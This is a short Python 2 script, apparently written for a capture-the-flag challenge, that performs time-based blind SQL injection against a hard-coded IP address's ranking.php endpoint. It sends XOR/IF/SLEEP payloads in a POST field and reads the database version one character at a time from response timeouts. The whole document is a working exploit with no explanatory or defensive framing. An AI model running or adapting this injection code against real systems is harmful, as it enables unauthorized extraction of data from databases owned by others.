import requests
import urllib
import urllib2
def check_url(payload):
    flag=0
    postdata = {
        'bbxb':payload,
        }
    url="http://150.109.67.179/ranking.php"
    postdata=urllib.urlencode(postdata)
    try:
        request = urllib2.Request(url,postdata)
        response = urllib2.urlopen(request,timeout = 5)
        html = response.read()
        #print html
    except Exception,e:
        flag=1
    return flag
def set_payload():
    a=''
    for j in range(8):
        for i in range(47,128):
            payload = "/*'XOR(if(ascii(substr(version(),%d,1))>%d,0,sleep(10)))OR'*/"%(j,i)
            print payload
            b=check_url(payload)
            print b
            if(b):
                a=a+chr(i)
                print a
                break
set_payload()
